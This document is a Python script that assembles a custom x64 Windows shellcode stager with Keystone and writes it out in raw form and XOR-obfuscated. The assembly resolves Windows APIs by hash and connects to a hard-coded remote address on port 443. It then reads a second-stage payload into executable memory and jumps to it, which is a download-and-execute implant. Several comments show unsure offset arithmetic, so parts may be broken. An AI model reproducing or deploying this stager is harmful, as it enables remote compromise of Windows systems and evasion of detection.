#!/usr/bin/python
import ctypes, struct
from ctypes import wintypes
from keystone import *

CODE = (
'''
start:
    mov rbp, rsp
    sub rsp, 1600

resolve_kernel32:
    mov dl, 0x4b                        # dl = 'K'
    mov rcx, 0x60                       #
    mov r8, gs:[rcx]                    # R8 = address of PEB
    mov rdi, [r8 + 0x18]                # RDI = address of _PEB_LDR_DATA
    mov rdi, [rdi + 0x30]               # RDI = address of InInitializationOrderModuleList (first _LIST_ENTRY)
search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]               # RBX = DllBase
    mov rsi, [rdi + 0x40]               # RSI = address of UNICODE string BaseDllName.Buffer
    mov rdi, [rdi]                      # RDI = address of the next _LIST_ENTRY
    cmp [rsi + 0x18], cx                # Compare the 24-th UNICODE char with NULL
    jne search                          # If length of BaseDllName is not 12 UNICODE chars, continue searching
    cmp [rsi], dl                       # Compare the first UNICODE char with 'K'
    jne search                          # If the first UNICODE char is not 'K', continue searching

find_function_jmp:
    jmp callback                        # Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop rsi                             # The address of find_function is popped in RSI
    mov [rbp + 0x8], rsi                # The address of find_function is stored at (RBP + 8)
    jmp resolve_k32_sym                 # Once the address of find_function has been stored, proceed with the resolution of kernel32 symbols

callback:
    call get_find_function_addr         # When this call is done, the address of the 1st instruction find_function (add rsp, 8) is pushed to the stack
                                        # This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
                
find_function:         
    add rsp, 8                          # Point RSP to (Number of hash bytes + 8)
    pop rax                             # RAX = Number of hash bytes + 8
    push -1                             # Write -1 on the stack instead of (Number of hash bytes + 8)
    add rsp, rax                        # Add (Number of hash bytes + 8) to RSP: it now points to 0x0000000000000000

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]               # EAX = offset to the PE Header of the module = e_lfanew
    mov edi, [rbx + rax + 0x88]         # EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add rdi, rbx                        # RDI = VMA of the Export Directory Table of the module
    mov ecx, [rdi + 24]                 # ECX = NumberOfNames (field of the Export Directory Table of the module)
    mov eax, [rdi + 32]                 # EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    add rax, rbx                        # EAX = VMA of AddressOfNames
    mov [rbp - 8], rax                  # Save the VMA of AddressOfNames at (EBP - 8): this location is never touched for anything else

find_function_loop:
    dec ecx                             # Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov rax, [rbp - 8]                  # EAX = VMA of AddressOfNames
    mov esi, [rax + rcx * 4]            # ESI = RVA of the current Symbol Name
    add rsi, rbx                        # RSI = VMA of the current Symbol Name

compute_hash:
    xor rax, rax                        # EAX = 0
    cdq                                 # If the MSB of EAX = 1: EDX = 0x11111111
                                        # If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX

compute_hash_repeat:
    ror edx, 0xd                        # Right-shift EDX of 13 bits
    add edx, eax                        # EDX += current EAX value
    lodsb                               # Load the byte pointed by ESI into AL
    test al, al                         # Test if the NULL terminator of the Symbol Name has been reached
    jnz compute_hash_repeat             # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                        # At this point, EDX contains the computed hash of the current symbol

find_function_compare:                          
    cmp edx, [rsp - 8]                  # Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop              # If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                        # If ZF = 1, the hash is equal: symbol found: continue hereby
    mov edx, [rdi + 36]                 # EDX = RVA of the AddressOfNameOrdinals array
    add rdx, rbx                        # RDX = VMA of the AddressOfNameOrdinals array
    mov cx, [rdx + 2 * rcx]             # CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, [rdi + 28]                 # EDX = RVA of the AddressOfFunctions array
    add rdx, rbx                        # RDX = VMA of the AddressOfFunctions array
    mov eax, [rdx + 4 * rcx]            # EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add rax, rbx                        # EAX = VMA of the wanted symbol
    push rax                            # Push the wanted symbol's VMA onto the stack:
    mov rax, [rsp - 8]
    cmp rax, -1                         # If *(RSP - 8) is -1: ZF = 1: all wanted symbols have been resolved
    jnz find_function_loop2             # Until all wanted symbols have been resolved, continue looping

find_function_finish:                   # When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub rsp, 16                         # Point RSP to the Return Address of find_function
    ret                                 # Return

resolve_k32_sym:
    mov rax, 0x00000000ec0e4e8e         # Hash of LoadLibraryA
    push rax
    mov rax, 0x0000000091afca54         # Hash of VirtualAlloc
    push rax
    mov rax, 0x00000000ca2bd06b         # Hash of CreateThread
    push rax
    mov rax, 0x0000000078b5b983         # Hash of TerminateProcess
    push rax
    mov rax, 40                         # Push 40 (4 funcs)
    push rax
    call [rbp + 8]                      # Call to find_function

load_ws2_32:
    mov rax, 0x0000000000006C6C         # 'll x00 x00 x00 x00 x00 x00' (reversed)
    push rax
    mov rax, 0x642E32335F327377         # 'ws2_32.d' (reversed)
    push rax
    mov rcx, rsp                        # Paramter 1 = address of "ws2_32.dll"
    sub rsp, 40                         # Create 40 bytes of room on the stack
    call [rsp + 88]                     # Call LoadLibraryA (Adjusted offset: 40+16+32 = 88)
    nop

resolve_ws2_sym:
    mov rbx, rax                        # RBX = Base Address of ws2_32.dll
    mov rax, 0x0000000060aaf9ec         # Hash of connect
    push rax
    mov rax, 0x00000000adf509d9         # Hash of WSASocketA
    push rax
    mov rax, 0x000000003bfcedcb         # Hash of WSAStartup
    push rax
    mov rax, 0x00000000e71819b6         # Hash of recv
    push rax
    mov rax, 40
    push rax                            # Push 40 (4 funcs)
    call [rbp + 8]                      # Call find_function

    sub rsp, 512

call_WSAStartup:
    mov rcx, 0x202                      # RCX = WinSock Version 2.2
    lea rdx, [rsp + 800]                # RDX = Address of output WSAData structure
    call [rsp + 528]                    # Call WSAStartup (Offset: 512+16 = 528. Wait, gap 8? Recv=520, Setup=528)

call_WSASocketA:
    mov rcx, 2                          # Parameter af = 2 (AF_INET)
    mov rdx, 1                          # Parameter type = 1
    mov r8, 6                           # Parameter protocol = 6 (TCP)
    xor r9, r9                          # Parameter lpProtocolInfo = 0
    mov [rsp + 32], r9                  # Parameter dwFlags = 0
    mov [rsp + 40], r9                  # Parameter g = 0
    call [rsp + 536]                    # Call WSASocketA (Offset: 528+8 = 536)

call_connect:
    mov rsi, rax                        # Save socket fd in RSI
    mov rcx, rax                        # RCX = Parameter s = socket fd created with WSSocketA
    mov r8, 16                          # R8 = Parameter namelen = 16
    
    # 0x4201A8C0FB200002
    # 0x010a0a0abb010002 -> 10.10.10.10:443

    mov r9, 0x9d2da8c0bb010002          # R9 = IPv4 + Port
    lea rdx, [rsp + 800]                # RDX = Parameter name
    mov [rdx], r9                       
    xor r9, r9
    mov [rdx + 8], r9                   
    call [rsp + 544]                    # Call connect (Offset: 536+8=544)

# --- Staging Logic ---

read_size:
    mov rcx, rsi                        # RCX = Socket
    lea rdx, [rsp + 800]                # RDX = Buffer for size
    mov r8, 4                           # R8 = 4 bytes
    xor r9, r9                          # R9 = Flags 0
    call [rsp + 520]                    # Call recv (Recv is top of WS2: 512+8=520)
    
    # Check if failed? (rax <= 0)
    test eax, eax
    jle call_TerminateProcess

    # Get Size
    mov eax, [rsp + 800]                # EAX = Size
    mov ebx, eax                        # EBX = Size (save for loop)
    
allocate_stage:
    xor rcx, rcx                        # RCX = NULL
    mov rdx, rax                        # RDX = Size
    mov r8, 0x3000                      # R8 = MEM_COMMIT | MEM_RESERVE
    mov r9, 0x40                        # R9 = PAGE_EXECUTE_READWRITE
    call [rsp + 632]                    # Call VirtualAlloc (Offset: 544+72=616? No. Term=616, Thrd=624, Alloc=632)
    
    test rax, rax
    jz call_TerminateProcess
    mov rdi, rax                        # RDI = Stage Buffer
    mov r12, rax                        # R12 = Stage Buffer (Base) - save for execution

read_stage_loop:
    test ebx, ebx
    jz execute_stage

    mov rcx, rsi                        # RCX = Socket
    mov rdx, rdi                        # RDX = Current Buffer Ptr
    mov r8, rbx                         # R8 = Remaining Size
    xor r9, r9                          # R9 = Flags 0
    
    # Stack alignment? We have 512 bytes space, should be fine.
    call [rsp + 520]                    # Call recv
    
    test eax, eax
    jle call_TerminateProcess
    
    add rdi, rax
    sub ebx, eax
    jmp read_stage_loop

execute_stage:
    # Direct execution of stage
    # R12 = Stage Address
    # RSI = Socket
    mov rdi, rsi                        # RDI = Socket (Standard convention for stages)
    mov rcx, rsi                        # RCX = Socket (Just in case)
    jmp r12                             # Jump to stage

    # TerminateProcess logic if needed for error handling ONLY
call_TerminateProcess:
    xor rcx, rcx
    dec rcx                             # Parameter hProcess = -1 = this process
    xor rdx, rdx                        # Parameter uExitCode = 0
    call [rsp + 616]                    # Call TerminateProcess (Offset: 616)
'''
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)

# Save raw shellcode
with open("shellcode.bin", "wb") as f:
    f.write(sh)
print("[+] Raw shellcode saved to shellcode.bin")

# Encrypt with XOR
key = b"Gdb1p_dnbp1DD@#"
enc_sh = bytearray()
shellcode_bytes = bytearray(sh)

for i in range(len(shellcode_bytes)):
    enc_sh.append(shellcode_bytes[i] ^ key[i % len(key)])

with open("enc_shellcode.bin", "wb") as f:
    f.write(enc_sh)

print(f"[+] Encrypted shellcode saved to enc_shellcode.bin")
